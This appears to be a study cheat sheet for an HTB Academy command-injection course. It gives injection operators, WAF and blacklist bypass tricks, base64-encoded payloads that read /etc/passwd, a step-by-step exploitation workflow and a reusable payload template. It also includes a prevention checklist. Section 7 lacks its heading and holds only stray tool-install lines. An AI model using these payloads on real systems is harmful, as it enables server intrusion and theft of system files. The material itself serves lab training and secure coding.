# Command Injections — Full Module Cheat Sheet

**HTB Academy – Command Injections (Exam Reference)**

---

## 1. Fundamentals

**Command Injection:** execute arbitrary OS commands on the back-end server via unsanitized user input used in a command-execution function.

**Injection (general):** user input misinterpreted as part of a query/code. OWASP Top 10 → **#3** risk.

| Injection Type | Description |
|---|---|
| OS Command Injection | User input directly used in an OS command |
| Code Injection | User input used in a function that evaluates code |
| SQL Injection | User input used in an SQL query |
| XSS / HTML Injection | Exact user input displayed on a page |

**Vulnerable PHP functions:** `exec`, `system`, `shell_exec`, `passthru`, `popen`
**Vulnerable NodeJS functions:** `child_process.exec`, `child_process.spawn`

```php
system("touch /tmp/" . $_GET['filename'] . ".pdf");
```
```javascript
child_process.exec(`touch /tmp/${req.query.filename}.txt`);
```

Not language-specific — any language/framework with a command-exec function is a candidate. Also affects thick clients/binaries, not just web apps.

---

## 2. Detection

- Detection = exploitation for basic cases: append a command, see if output changes.
- Advanced cases → fuzzing / code review, build payload gradually.
- Example: `Host Checker` taking an IP → backend likely runs `ping -c 1 OUR_INPUT`.

### Injection Operators

| Operator | Char | URL-Encoded | Executes |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (2nd often shown first) |
| Pipe | `\|` | `%7c` | Both (only 2nd output shown) |
| AND | `&&` | `%26%26` | Both, only if 1st succeeds |
| OR | `\|\|` | `%7c%7c` | 2nd only, only if 1st fails |
| Sub-Shell | `` `` `` | `%60%60` | Both — **Linux only** |
| Sub-Shell | `$()` | `%24%28%29` | Both — **Linux only** |

- Works across languages/OS/frameworks **except**: `;` fails in Windows **CMD** (works in PowerShell).

### AND / OR Examples

```bash
ping -c 1 127.0.0.1 && whoami      # both run if ping succeeds
ping -c 1 127.0.0.1 || whoami      # whoami runs ONLY if ping fails
ping -c 1 || whoami                # break ping deliberately → whoami runs
```

### Operators by Injection Type (reference table)

| Injection Type | Operators |
|---|---|
| SQL Injection | `'` `,` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `\|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `\|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory Traversal | `../` `..\` `%00` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |

This module = **direct** command injection only. Indirect/blind → *Whitebox Pentesting 101: Command Injection*.

## 3. Identifying Filters / WAFs

- Mitigation layers: **blacklisted characters/words** (app-level) and/or **WAF** (broader).
- Error **in the output field** → app-level block. Error on a **different page** (shows your IP/request) → likely WAF.
- Isolate by testing **one character/operator at a time** against a known-good baseline (`127.0.0.1`).

```php
$blacklist = ['&', '|', ';', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) { echo "Invalid input"; }
}
```

## 4. Bypassing Character Filters

### Operators
- New-line (`%0a`) is commonly **not blacklisted** (often required in legit input) → usable as injection operator on both Linux and Windows.

### Spaces
| Bypass | Example | Notes |
|---|---|---|
| Tab | `%09` | Treated same as space by shell, both OSes |
| `${IFS}` | `${IFS}` | Linux env var; default = space + tab |
| Brace expansion | `{ls,-la}` | Bash auto-inserts spaces between comma args |

### Slashes / Semicolons / Other Chars — Env Var Slicing

**Linux:**
```bash
echo ${PATH:0:1}         # /   (start:length slice)
echo ${LS_COLORS:10:1}   # ;
```
Combined: `127.0.0.1${LS_COLORS:10:1}${IFS}whoami`

**Windows CMD:**
```cmd
echo %HOMEPATH:~6,-11%   # \   (start,negative-end slice)
```

**Windows PowerShell (array indexing):**
```powershell
$env:HOMEPATH[0]         # \
```
`Get-ChildItem Env:` lists all vars to search for useful chars.

### Character Shifting (Linux)
```bash
man ascii                        # find char before target in ASCII table
echo $(tr '!-}' '"-~'<<<[)       # [ is before \ → outputs \
```

## 5. Bypassing Command Blacklists

```php
$blacklist = ['whoami', 'cat', ...];  // exact substring match → bypassable by altering the string
```

### Obfuscation via Ignored Characters

| Technique | Platform | Rule |
|---|---|---|
| Quotes `'`/`"` | Linux & Windows | No mixing types; even count required |
| Backslash `\` | Linux only | Any count, incl. 1 |
| `$@` | Linux only | Any count, incl. 1 |
| Caret `^` | Windows (CMD) only | Insert anywhere mid-command |

```bash
w'h'o'am'i      # quotes, even count, same type
who$@ami        # Linux-only
w\ho\am\i       # Linux-only
```
```cmd
who^ami         :: Windows CMD only
```

## 6. Advanced Obfuscation

### Case Manipulation
- **Windows:** CMD/PowerShell are case-insensitive → `WhOaMi` just works.
- **Linux (case-sensitive):**
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```
⚠️ Watch for spaces inside the obfuscation command itself — may need `%09` instead.

### Reversed Commands
```bash
echo 'whoami' | rev      # imaohw
$(rev<<<'imaohw')        # executes whoami
```
```powershell
"whoami"[-1..-20] -join ''                              # imaohw
iex "$('imaohw'[-1..-20] -join '')"                      # executes whoami
```
If also bypassing char filters, reverse those characters too.

### Encoded Commands (base64)
```bash
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
- `<<<` avoids the pipe `|` character.
- If `bash`/`base64` are filtered → bypass with char-insertion tricks, or swap for `sh` / `openssl` / `xxd`.

**Windows base64 (Unicode):**
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
Linux→Windows-compatible encoding: `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`

**Other techniques not detailed:** wildcards, regex, output redirection, integer expansion — see PayloadsAllTheThings.

cd Bashfuscator && pip3 install setuptools==65 && python3 setup.py install --user
cd ./bashfuscator/bin/

## 8. Prevention (Defender's Checklist)

**Avoid system-command functions entirely** where possible:
- Use built-ins instead (e.g., PHP `fsockopen` instead of shelling out to `ping`).
- If unavoidable: never feed raw user input in; validate + sanitize first; minimize usage.

**Input Validation** (front-end AND back-end):
```php
filter_var($_GET['ip'], FILTER_VALIDATE_IP)
```
- Non-standard formats → regex (`preg_match` / JS regex).
- NodeJS: libraries like `is-ip`.

**Input Sanitization** (after validation, always):
```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);   // whitelist approach
```
```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```
- NodeJS: `DOMPurify.sanitize(ip)`.
- Blacklisting words/chars = **not sufficient** (proven throughout this module).
- If special chars must be allowed (e.g. comments): `escapeshellcmd` (PHP) / `escape()` (Node) — but **escaping is bypassable**, not a complete fix.

**Server Configuration:**
- WAF: built-in (`mod_security`) + external (Cloudflare, Fortinet, Imperva…)
- **Principle of Least Privilege** — run server as low-priv user (`www-data`)
- Disable risky functions: PHP `disable_functions=system,...`
- Restrict scope: PHP `open_basedir = '/var/www/html'`
- Reject double-encoded requests / non-ASCII in URLs
- Avoid outdated/sensitive libraries (e.g., PHP CGI)

**Bottom line:** secure coding + server hardening + ongoing pentesting. Blacklists/escaping alone are not secure; large codebases mean one mistake anywhere reintroduces the vuln.

## 9. Exploitation Methodology (Exam Workflow)

1. **Recon** the app's features — look for functionality likely to shell out (ping/host checks, file ops: copy/move/zip, conversion tools, etc.).
2. **Identify candidate parameters** (intercept requests in Burp — look for path/filename/IP/host fields).
3. **Probe with a simple payload** — try raw operators first (`;`, `&&`, `\n`); if blocked, try a **reversed command** (`$(rev<<<'imaohw')`) to confirm RCE while dodging naive keyword blacklists.
4. **Test each feature/endpoint individually** — similar-looking functions (e.g., Copy vs Move) may differ in vulnerability.
5. **If blocked, isolate the filter:**
   - One character/operator at a time → find exactly what's blacklisted.
   - Determine app-level vs WAF (error location/format).
6. **Bypass character filters:** swap space → tab/`${IFS}`/brace-expansion; swap `/` `;` etc. → env-var slicing or ASCII shifting.
7. **Bypass command filters:** quote-insertion, `\`/`$@` (Linux), `^` (Windows), case manipulation, reversed commands.
8. **Escalate to encoded payloads** for stubborn filters/WAFs:
   ```bash
   $($(base64%09-d<<<BASE64_OF_COMMAND))
   ```
9. **Automate** with Bashfuscator / Invoke-DOSfuscation if manual techniques fail against advanced WAFs.
10. **Achieve objective** (read flag/file, get shell, etc.) and document the vulnerable parameter + working payload.

### Quick Payload Template (Linux, filtered IP/space/semicolon field)

```bash
127.0.0.1${LS_COLORS:10:1}${IFS}$($(base64%09-d<<<BASE64_CMD))
```
